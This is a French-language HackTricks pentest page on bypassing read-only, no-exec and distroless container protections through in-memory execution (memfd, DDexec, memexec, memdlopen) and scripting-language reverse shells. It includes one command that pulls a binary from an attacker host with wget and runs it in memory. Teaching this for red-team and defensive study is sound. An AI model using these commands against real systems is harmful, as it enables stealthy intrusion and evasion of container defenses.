# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Vidéos

Dans les vidéos suivantes, vous pouvez trouver les techniques mentionnées dans cette page expliquées plus en détail :

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## Scénario read-only / no-exec

Il est de plus en plus courant de trouver des machines Linux montées avec une protection de système de fichiers **read-only (ro)**, surtout dans les containers. Cela s'explique par le fait que pour exécuter un container avec un système de fichiers ro il suffit de définir **`readOnlyRootFilesystem: true`** dans le `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Cependant, même si le système de fichiers est monté en ro, **`/dev/shm`** restera inscriptible, donc ce n'est pas vrai qu'on ne peut rien écrire sur le disque. En revanche, ce dossier sera **monté avec la protection no-exec**, donc si vous téléchargez un binaire ici vous **ne pourrez pas l'exécuter**.

> [!WARNING]
> D'un point de vue red team, cela rend **compliqué de télécharger et d'exécuter** des binaires qui ne sont pas déjà sur le système (comme des backdoors ou des enumerators comme `kubectl`).

## Contournement le plus simple : Scripts

Notez que je parlais de binaires, vous pouvez **exécuter n'importe quel script** tant que l'interpréteur est présent sur la machine, par exemple un **shell script** si `sh` est disponible ou un **python script** si `python` est installé.

Cependant, cela ne suffit pas pour exécuter votre backdoor binaire ou d'autres outils binaires dont vous pourriez avoir besoin.

## Contournements en mémoire

Si vous voulez exécuter un binaire mais que le système de fichiers l'en empêche, la meilleure façon est de **l'exécuter depuis la mémoire**, car les **protections ne s'y appliquent pas**.

### FD + exec syscall bypass

Si vous disposez de moteurs de script puissants sur la machine, tels que **Python**, **Perl** ou **Ruby**, vous pouvez télécharger le binaire pour l'exécuter depuis la mémoire, le stocker dans un descripteur de fichier en mémoire (`create_memfd` syscall), qui ne sera pas soumis à ces protections, puis appeler un **`exec` syscall** en indiquant le **fd comme fichier à exécuter**.

Pour cela vous pouvez facilement utiliser le projet [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Vous pouvez lui fournir un binaire et il générera un script dans le langage indiqué avec le **binaire compressé et b64 encoded** avec les instructions pour **le décoder et le décompresser** dans un **fd** créé en appelant le syscall `create_memfd` et un appel au syscall **exec** pour l'exécuter.

> [!WARNING]
> Cela ne fonctionne pas dans d'autres langages de script comme PHP ou Node car ils n'ont pas de **méthode par défaut pour appeler des syscalls bruts** depuis un script, il n'est donc pas possible d'appeler `create_memfd` pour créer le **fd mémoire** afin de stocker le binaire.
>
> De plus, créer un **fd régulier** avec un fichier dans `/dev/shm` ne fonctionnera pas, car vous ne serez pas autorisé à l'exécuter en raison de l'application de la **protection no-exec**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) est une technique qui permet de **modifier la mémoire de son propre processus** en écrasant son **`/proc/self/mem`**.

Par conséquent, en **contrôlant le code assembleur** exécuté par le processus, vous pouvez écrire un **shellcode** et "muter" le processus pour **exécuter n'importe quel code arbitraire**.

> [!TIP]
> **DDexec / EverythingExec** vous permettra de charger et d'**exécuter** votre propre **shellcode** ou **n'importe quel binaire** depuis la **mémoire**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Pour plus d'informations sur cette technique consultez le Github ou :


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) est l'étape suivante naturelle de DDexec. C'est un **DDexec shellcode demonised**, donc chaque fois que vous voulez **exécuter un binaire différent** vous n'avez pas besoin de relancer DDexec, vous pouvez simplement lancer le shellcode memexec via la technique DDexec puis **communiquer avec ce deamon pour fournir de nouveaux binaires à charger et exécuter**.

Vous pouvez trouver un exemple montrant comment utiliser **memexec to execute binaries from a PHP reverse shell** dans [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Avec un objectif similaire à DDexec, la technique [**memdlopen**](https://github.com/arget13/memdlopen) permet une **façon plus simple de charger des binaires** en mémoire pour les exécuter ensuite. Elle peut même permettre de charger des binaires avec des dépendances.

## Distroless Bypass

Pour une explication dédiée de **what distroless actually is**, quand cela aide, quand ce n'est pas le cas, et comment cela modifie le post-exploitation tradecraft dans les conteneurs, consultez :

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Les distroless conteneurs contiennent uniquement les **composants minimum nécessaires pour exécuter une application ou un service spécifique**, tels que les bibliothèques et dépendances d'exécution, mais excluent des composants plus volumineux comme un gestionnaire de paquets, un shell ou des utilitaires système.

L'objectif des distroless conteneurs est de **réduire la surface d'attaque des conteneurs en éliminant les composants inutiles** et de minimiser le nombre de vulnérabilités susceptibles d'être exploitées.

### Reverse Shell

Dans un distroless container vous pourriez **ne même pas trouver `sh` ou `bash`** pour obtenir un shell classique. Vous ne trouverez pas non plus de binaires tels que `ls`, `whoami`, `id`... tout ce que vous exécutez habituellement sur un système.

> [!WARNING]
> Par conséquent, vous **ne pourrez pas** obtenir un **reverse shell** ou **enumerate** le système comme vous le feriez habituellement.

Cependant, si le container compromis exécute par exemple une application flask, alors python est installé, et donc vous pouvez obtenir un **Python reverse shell**. S'il exécute node, vous pouvez obtenir un Node rev shell, et il en va de même pour la plupart des **scripting language**.

> [!TIP]
> En utilisant le scripting language vous pourriez **enumerate the system** grâce aux capacités du langage.

S'il n'y a pas de protections `read-only/no-exec`, vous pourriez abuser de votre reverse shell pour **écrire vos binaires dans le système de fichiers** et les **exécuter**.

> [!TIP]
> Cependant, dans ce type de containers ces protections existeront généralement, mais vous pourriez utiliser les **techniques d'exécution en mémoire précédentes pour les contourner**.

Vous pouvez trouver des **exemples** sur la façon d'**exploiter certaines vulnérabilités RCE** pour obtenir des **reverse shells** via des scripting languages et exécuter des binaires depuis la mémoire dans [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
